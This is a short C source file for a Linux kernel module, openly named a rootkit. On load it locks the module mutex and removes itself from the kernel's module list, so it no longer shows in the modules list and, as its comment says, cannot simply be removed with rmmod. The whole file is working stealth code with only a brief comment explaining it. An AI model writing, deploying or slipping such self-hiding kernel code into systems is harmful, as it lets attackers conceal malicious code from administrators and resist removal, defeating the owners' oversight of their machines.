/*
  This module after loading is making it invisible in modules list
  
  That mean You can not simply 'rmmod it';
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/rculist.h>
#include <linux/sysfs.h>
 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("gotoc");
MODULE_DESCRIPTION("Hidden module");
 
static int __init rootkit_init(void)
{
  struct module *mod = THIS_MODULE;
  printk(KERN_INFO "rootkit_mod loading.\n");
 
  printk(KERN_INFO "rootkit_mod hidind itself.\n");
/* Based at: kernel/module.c
   The mutex is because of risk another referencing to list.
   in kernel/module.c each list_del operation are in mutex
 */
  mutex_lock(&module_mutex);
  list_del(&mod->list);
  mutex_unlock(&module_mutex);
 
  printk(KERN_INFO "rootkit_mod done.\n");
  return 0;
}
module_init(rootkit_init);
 
static void __exit rootkit_exit(void)
{
  printk(KERN_INFO "rootkit_mod unloaded.\n");
}
module_exit(rootkit_exit);
